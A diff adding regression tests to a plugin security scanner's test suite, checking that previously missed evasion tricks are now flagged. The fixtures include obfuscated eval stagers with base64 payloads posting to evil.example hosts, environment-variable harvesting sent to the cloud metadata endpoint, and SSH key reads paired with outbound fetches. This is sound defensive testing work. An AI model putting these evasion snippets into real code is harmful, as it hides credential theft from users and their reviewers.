@@ -337,6 +337,355 @@ describe("directory scan", () => {
   });
 });
 
+/**
+ * Regression fixtures from docs/reviews/scanner-selfaudit.md.
+ *
+ * Every snippet below was measured *undetected* by the pre-hardening scanner. They are
+ * kept verbatim so a future refactor that reopens a bypass fails loudly, and each is
+ * paired with the benign shape the same detector must not flag. The self-audit's own
+ * closing instruction: "extend self-test with the bypass snippets from part 1 as
+ * negative fixtures once fixes land."
+ */
+describe("self-audit bypass regressions", () => {
+  const ids = (findings: ReturnType<typeof scanContent>) => findings.map((f) => f.id);
+
+  describe("bypass 1: indirect eval stager with base64 payload", () => {
+    const src =
+      'const run = (0, eval);\n' +
+      'run(atob("ZmV0Y2goImh0dHBzOi8vY29sbGVjdC5ldmlsLmV4YW1wbGUveCIse21ldGhvZDoiUE9TVCJ9KTs="));\n';
+
+    it("is no longer silent (was: zero findings, score 100, grade A)", () => {
+      const findings = scanContent(src, "lib/stager.js");
+      assert.ok(findings.length > 0, "indirect eval stager produced no findings");
+      assert.ok(ids(findings).includes("EXEC-010"), "indirect (0, eval) must fire EXEC-010");
+    });
+
+    it("no longer grades A", () => {
+      const g = grade(scanContent(src, "lib/stager.js"));
+      assert.notEqual(g.grade, "A");
+      assert.ok(g.score < 100);
+    });
+
+    it("flags the staged decode despite the variable hop (OBFU-010)", () => {
+      assert.ok(ids(scanContent(src, "lib/stager.js")).includes("OBFU-010"));
+    });
+
+    for (const [label, variant] of [
+      ["(0, eval)", "const run = (0, eval); run(src);"],
+      ["globalThis.eval", "globalThis.eval(src);"],
+      ["window.eval", "window.eval(src);"],
+      ['globalThis["eval"]', 'globalThis["eval"](src);'],
+      ["aliased eval", "const e = eval;\ne(src);"],
+      ["bare Function()", 'const f = Function("a", "return a");'],
+    ] as const) {
+      it(`catches the ${label} variant`, () => {
+        const findings = dynamicEvalRule.match(variant, "lib/v.js");
+        assert.ok(findings.length > 0, `${label} still produces zero findings`);
+        assert.ok(
+          findings.every((f) => f.family === "EXEC"),
+          "variant must be reported as dynamic execution",
+        );
+      });
+    }
+
+    it("does not flag benign identifiers that merely contain 'eval'", () => {
+      const benign =
+        'const evaluation = compute(x);\n' +
+        'export function evaluate(node) { return node.value; }\n' +
+        'const retrieval = cache.get(key);\n' +
+        'const f = new Map();\n';
+      assert.deepEqual(dynamicEvalRule.match(benign, "src/ok.js"), []);
+    });
+
+    it("does not flag a call to an unrelated function named Function-ish", () => {
+      assert.deepEqual(dynamicEvalRule.match("const t = obj.Function(x);\n", "src/ok.js"), []);
+    });
+  });
+
+  describe("bypass 2: computed-property env harvest through a third-party client", () => {
+    const src =
+      'import axios from "axios";\n' +
+      'export async function ping(url) {\n' +
+      '  await axios.post(url ?? "http://169.254.169.254/latest/meta-data/", { ...process["env"] });\n' +
+      '}\n';
+
+    it("detects the computed-property env harvest (was: invisible)", () => {
+      assert.ok(ids(credentialAccessRule.match(src, "lib/telemetry.js")).includes("CRED-006"));
+    });
+
+    it("detects computed secret reads: process[\"env\"][\"GH_TOKEN\"]", () => {
+      const findings = credentialAccessRule.match('const t = process["env"]["GH_TOKEN"];\n', "lib/a.js");
+      assert.ok(ids(findings).includes("CRED-007"));
+    });
+
+    it("flags a non-documented string-keyed process member (CRED-011)", () => {
+      const findings = credentialAccessRule.match('const b = process["binding"]("fs");\n', "lib/a.js");
+      assert.ok(ids(findings).includes("CRED-011"));
+    });
+
+    it("does not flag string-keyed access to documented process members", () => {
+      const findings = credentialAccessRule.match(
+        'const p = process["platform"];\nconst a = process["argv"];\n',
+        "lib/a.js",
+      );
+      assert.ok(!ids(findings).includes("CRED-011"));
+    });
+
+    it("detects the third-party HTTP client import (NET-011)", () => {
+      assert.ok(ids(networkEgressRule.match(src, "lib/telemetry.js")).includes("NET-011"));
+      for (const pkg of ["got", "node-fetch", "undici", "ky", "superagent"]) {
+        const findings = networkEgressRule.match(`import c from "${pkg}";\n`, "lib/a.js");
+        assert.ok(ids(findings).includes("NET-011"), `${pkg} import not detected`);
+      }
+    });
+
+    it("treats the cloud metadata endpoint as critical (NET-012)", () => {
+      const findings = networkEgressRule.match(src, "lib/telemetry.js");
+      const meta = findings.find((f) => f.id === "NET-012");
+      assert.ok(meta, "169.254.169.254 must be named explicitly");
+      assert.equal(meta?.severity, "critical");
+    });
+
+    it("no longer grades C: the CRED+NET pair now gates", () => {
+      const g = grade(scanContent(src, "lib/telemetry.js"));
+      assert.equal(g.grade, "F");
+      assert.ok(g.gates.includes("cred-plus-net"));
+    });
+
+    it("catches staged exfil: decode to a variable, then POST it", () => {
+      const staged =
+        'const host = atob("ZXZpbC5leGFtcGxl");\n' +
+        'await fetch(host, { method: "POST", body: data });\n';
+      const findings = scanContent(staged, "lib/x.js");
+      assert.ok(ids(findings).includes("OBFU-010"), "decode + egress co-presence must fire");
+      assert.notEqual(grade(findings).grade, "A");
+    });
+
+    it("does not flag a plain configured URL variable with no decode in the file", () => {
+      const benign = 'const base = config.endpoint;\nawait fetch(base, { method: "POST" });\n';
+      assert.ok(!ids(networkEgressRule.match(benign, "src/ok.js")).includes("NET-014"));
+    });
+  });
+
+  describe("bypass 3: delayed staged loader via setTimeout(Buffer.from(...))", () => {
+    const src =
+      'const stage1 = "Y29uc29sZS5ldmFsKCdmZXRjaCgiaHR0cHM6Ly9leGFtcGxlLmNvbS9wIiknKQ==";\n' +
+      'setTimeout(Buffer.from(stage1, "base64").toString("utf8"), 60000);\n';
+
+    it("is no longer graded A on a single HOOK-006 (was: score 96, grade A)", () => {
+      const findings = scanContent(src, "lib/scheduler.js");
+      const g = grade(findings);
+      assert.notEqual(g.grade, "A");
+      assert.ok(findings.length > 1, "must produce more than the top-level-timer finding");
+    });
+
+    it("flags the decoded timer body as dynamic execution (EXEC-013)", () => {
+      assert.ok(ids(dynamicEvalRule.match(src, "lib/scheduler.js")).includes("EXEC-013"));
+    });
+
+    it("flags the decode inside an exec-capable module regardless of adjacency (OBFU-010)", () => {
+      assert.ok(ids(obfuscationRule.match(src, "lib/scheduler.js")).includes("OBFU-010"));
+    });
+
+    it("leaves evidence for a split blob under the 120-char gate (OBFU-012)", () => {
+      const findings = obfuscationRule.match(src, "lib/scheduler.js");
+      const short = findings.find((f) => f.id === "OBFU-012");
+      assert.ok(short, "sub-threshold blob in a decoding module must still be cited");
+      assert.equal(short?.severity, "low");
+    });
+
+    it("flags a non-function timer argument at medium (EXEC-014)", () => {
+      const findings = dynamicEvalRule.match('setTimeout(buildBody() + suffix, 10);\n', "src/a.js");
+      const hit = findings.find((f) => f.id === "EXEC-014");
+      assert.ok(hit);
+      assert.equal(hit?.severity, "medium");
+    });
+
+    it("does not flag ordinary timer usage", () => {
+      const benign =
+        'setTimeout(() => refresh(), 1000);\n' +
+        'setTimeout(function () { refresh(); }, 1000);\n' +
+        'setInterval(this.tick, 500);\n' +
+        'setTimeout(onTick, 500);\n' +
+        'setTimeout(async () => { await refresh(); }, 5);\n';
+      const findings = dynamicEvalRule.match(benign, "src/ok.js");
+      assert.deepEqual(findings, [], `false positive: ${ids(findings).join(", ")}`);
+    });
+
+    it("does not flag a short high-entropy literal in a module with no capability", () => {
+      const inert =
+        'export const INTEGRITY = "sha256-Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MGFiY2RlZmdoaWprbG1ub3A=";\n';
+      assert.deepEqual(obfuscationRule.match(inert, "src/ok.js"), []);
+    });
+  });
+
+  describe("finding 4: oversized files are cited, not silently skipped", () => {
+    const root = mkdtempSync(join(tmpdir(), "dsh-scan-oversize-"));
+    after(() => rmSync(root, { recursive: true, force: true }));
+    writeFileSync(join(root, "big.js"), `// ${"x".repeat(4096)}\nexport const ok = 1;\n`);
+
+    it("emits SUPPLY-001 for a file above the scan limit", () => {
+      const result = scanDirectory(root, { maxFileBytes: 128 });
+      const hit = result.findings.find((f) => f.id === "SUPPLY-001");
+      assert.ok(hit, "oversized file vanished from the report");
+      assert.equal(hit?.severity, "high");
+      assert.equal(hit?.path, "big.js");
+      assert.equal(result.stats.filesSkipped, 1);
+    });
+
+    it("caps the grade at C when content was not analyzed", () => {
+      const g = grade(scanDirectory(root, { maxFileBytes: 128 }).findings);
+      assert.ok(["C", "D", "F"].includes(g.grade));
+      assert.ok(g.gates.includes("unanalyzed-content"));
+    });
+
+    it("does not fire when every file is within the limit", () => {
+      const g = grade(scanDirectory(root).findings);
+      assert.ok(!g.gates.includes("unanalyzed-content"));
+    });
+  });
+
+  describe("part 4: grade gaming by file splitting", () => {
+    it("does not let a cross-module cred->send split escape the gate entirely", () => {
+      const findings = [
+        ...credentialAccessRule.match('readFileSync(home + "/.ssh/id_ed25519");\n', "lib/a.js"),
+        ...networkEgressRule.match('fetch("https://evil.example/x");\n', "lib/b.js"),
+      ];
+      const g = grade(findings);
+      assert.ok(
+        g.gates.includes("cred-plus-net-package"),
+        "same-package cred+net split must still gate",
+      );
+      assert.ok(["D", "F"].includes(g.grade as string));
+    });
+
+    it("escalates the split to F when a concealment signal is present", () => {
+      const findings = [
+        ...credentialAccessRule.match('readFileSync(home + "/.ssh/id_ed25519");\n', "lib/a.js"),
+        ...networkEgressRule.match('fetch("https://evil.example/x");\n', "lib/b.js"),
+        ...obfuscationRule.match('const _0x4f2a = ["log"];\n', "lib/c.js"),
+      ];
+      const g = grade(findings);
+      assert.equal(g.grade, "F");
+      assert.ok(g.gates.includes("cred-plus-net-split"));
+    });
+
+    it("caps at C when one family is fragmented across three or more files", () => {
+      const findings = ["lib/a.js", "lib/b.js", "lib/c.js"].flatMap((p) =>
+        networkEgressRule.match('fetch("https://api.github.com/x");\n', p),
+      );
+      const g = grade(findings);
+      assert.ok(g.gates.includes("finding-density"));
+      assert.ok(["C", "D", "F"].includes(g.grade as string));
+    });
+
+    it("leaves a two-file spread alone", () => {
+      const findings = ["lib/a.js", "lib/b.js"].flatMap((p) =>
+        networkEgressRule.match('fetch("https://api.github.com/x");\n', p),
+      );
+      assert.ok(!grade(findings).gates.includes("finding-density"));
+    });
+  });
+
+  describe("part 2: false-positive guards", () => {
+    it("EXEC-005 does not fire on RegExp.prototype.exec", () => {
+      const benign =
+        'const m = /^v(\\d+)/.exec(version);\n' +
+        'const n = pattern.exec(input);\n' +
+        'while ((match = re.exec(text)) !== null) { count += 1; }\n';
+      const findings = dynamicEvalRule.match(benign, "src/ok.js");
+      assert.ok(!findings.some((f) => f.id === "EXEC-005"), "RegExp .exec() false positive");
+    });
+
+    it("EXEC-005 still fires on a bare spawn call", () => {
+      const findings = dynamicEvalRule.match('spawn("git", ["status"]);\n', "src/a.js");
+      assert.ok(findings.some((f) => f.id === "EXEC-005"));
+    });
+
+    it("NET-010 stays high only for decode-fed concatenation", () => {
+      const decoded = networkEgressRule.match('const u = "https://" + atob(h) + "/c";\n', "lib/a.js");
+      assert.ok(decoded.some((f) => f.id === "NET-010" && f.severity === "high"));
+
+      const configured = networkEgressRule.match('const base = "https://" + host + "/api";\n', "src/ok.js");
+      assert.ok(!configured.some((f) => f.id === "NET-010"), "config-shaped base URL must not be high");
+      assert.ok(configured.some((f) => f.id === "NET-013" && f.severity === "medium"));
+    });
+
+    it("OBFU-006 does not fire on a leading UTF-8 BOM", () => {
+      const bommed = "\ufeffexport const ok = 1;\n";
+      assert.deepEqual(obfuscationRule.match(bommed, "src/ok.js"), []);
+    });
+
+    it("OBFU-006 still fires on a BOM-like character after offset 0", () => {
+      const hidden = 'const a = 1;\ufeff\nconst b = 2;\n';
+      assert.ok(obfuscationRule.match(hidden, "src/a.js").some((f) => f.id === "OBFU-006"));
+    });
+
+    it("OBFU-006 still fires on a bidi override", () => {
+      const trojan = 'const banner = "admin\u202e nimda";\n';
+      assert.ok(obfuscationRule.match(trojan, "src/a.js").some((f) => f.id === "OBFU-006"));
+    });
+
+    it("U+2028 in a string is low severity, not high", () => {
+      const findings = obfuscationRule.match('const s = "line one\u2028line two";\n', "src/a.js");
+      assert.ok(!findings.some((f) => f.id === "OBFU-006"));
+      const sep = findings.find((f) => f.id === "OBFU-011");
+      assert.ok(sep);
+      assert.equal(sep?.severity, "low");
+    });
+
+    it("HOOK rules do not fire on CI workflows", () => {
+      const workflow =
+        'name: ci\njobs:\n  build:\n    steps:\n      - run: npm install\n      - run: npx tsc --noEmit\n';
+      assert.deepEqual(lifecycleHooksRule.match(workflow, ".github/workflows/ci.yml"), []);
+    });
+
+    it("HOOK-007 still fires on runtime source", () => {
+      const runtime = 'await run("npm install " + pkg);\n';
+      assert.ok(lifecycleHooksRule.match(runtime, "src/install.js").some((f) => f.id === "HOOK-007"));
+    });
+
+    it("CRED does not fire on a credential file named in a YAML comment", () => {
+      const workflow = 'jobs:\n  build:\n    # writes a scoped .npmrc for the registry\n    steps: []\n';
+      assert.deepEqual(credentialAccessRule.match(workflow, ".github/workflows/ci.yml"), []);
+    });
+
+    it("CRED still fires on a real .npmrc reference in YAML", () => {
+      const workflow = 'jobs:\n  build:\n    steps:\n      - run: cat "~/.npmrc"\n';
+      assert.ok(credentialAccessRule.match(workflow, ".github/workflows/ci.yml").length > 0);
+    });
+
+    it("a textbook benign GitHub API plugin accrues no concealment or credential-harvest findings", () => {
+      const plugin =
+        'import { request } from "node:https";\n' +
+        'const token = process.env.GITHUB_TOKEN;\n' +
+        'export async function repos() {\n' +
+        '  return fetch("https://api.github.com/user/repos", { headers: { authorization: `Bearer ${token}` } });\n' +
+        '}\n';
+      const findings = scanContent(plugin, "src/github.js");
+      // Declaring egress is the point of the NET family, so NET findings are expected and
+      // wanted here. What must not happen is the hardening pass inventing OBFU/EXEC noise
+      // or reading the named token as a harvest.
+      const unexpected = findings.filter((f) => f.family !== "NET" && f.id !== "CRED-007");
+      assert.deepEqual(unexpected, [], `unexpected finding: ${unexpected.map((f) => f.id).join(", ")}`);
+      assert.ok(!findings.some((f) => f.severity === "critical"), "no critical findings");
+      assert.ok(
+        findings.every((f) => f.id !== "NET-007"),
+        "api.github.com is a known host and must not be reported as unknown egress",
+      );
+    });
+
+    it("a clean plugin with no capability produces nothing at all", () => {
+      const plugin =
+        'export const name = "starter";\n' +
+        'export function apply(ctx, config) {\n' +
+        '  ctx.commands.register({ name: "starter-ping", description: "Reply with pong.", handler: () => ({ kind: "success" }) });\n' +
+        '}\n';
+      assert.deepEqual(scanContent(plugin, "src/index.ts"), []);
+    });
+  });
+});
+
 describe("cli argument parsing", () => {
   it("parses a full argument list", () => {
     const parsed = parseArgs(["./plugin", "--json", "out.json", "--markdown", "card.md", "--fail-on", "high", "--quiet"]);
